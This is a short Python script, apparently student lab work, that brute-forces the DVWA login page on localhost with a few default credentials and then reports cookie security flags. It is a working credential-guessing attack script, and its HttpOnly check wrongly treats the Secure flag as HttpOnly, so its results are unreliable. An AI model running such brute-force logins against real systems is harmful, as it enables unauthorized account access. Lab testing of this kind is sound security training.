import requests

# Target URL for the DVWA Login page
LOGIN_URL = "http://localhost:8080/login.php"

# Dictionary of common weak credentials to test
CREDENTIALS = [
    {"user": "admin", "pass": "password"},  # Default DVWA login
    {"user": "admin", "pass": "admin123"},
    {"user": "user", "pass": "user"},
    {"user": "root", "pass": "toor"}
]

def perform_brute_force():
    print("--- [WebScanPro] Starting Week 5: Auth Testing ---")
    session = requests.Session()
    
    for cred in CREDENTIALS:
        print(f"[*] Testing: {cred['user']} / {cred['pass']}")
        
        # Data keys must match the HTML 'name' attributes your crawler found
        data = {'username': cred['user'], 'password': cred['pass'], 'Login': 'Login'}
        
        response = session.post(LOGIN_URL, data=data)
        
        # If we DON'T see 'Login failed', we likely broke in
        if "Login failed" not in response.text and response.status_code == 200:
            print(f"[!] SUCCESS: Valid Credentials Found -> {cred['user']}:{cred['pass']}")
            check_session_security(session)
            return
            
    print("[-] Brute force failed: No default credentials work.")

def check_session_security(session):
    print("\n--- [Session Hijacking Test] ---")
    for cookie in session.cookies:
        print(f"[*] Cookie: {cookie.name}")
        print(f"    - HttpOnly: {cookie.has_nonstandard_attr('HttpOnly') or cookie.secure}")
        print(f"    - Secure Flag: {cookie.secure}")
        
        if not cookie.secure:
            print("    [!] RISK: Insecure cookie detected! Can be hijacked over HTTP.")

if __name__ == "__main__":
    perform_brute_force()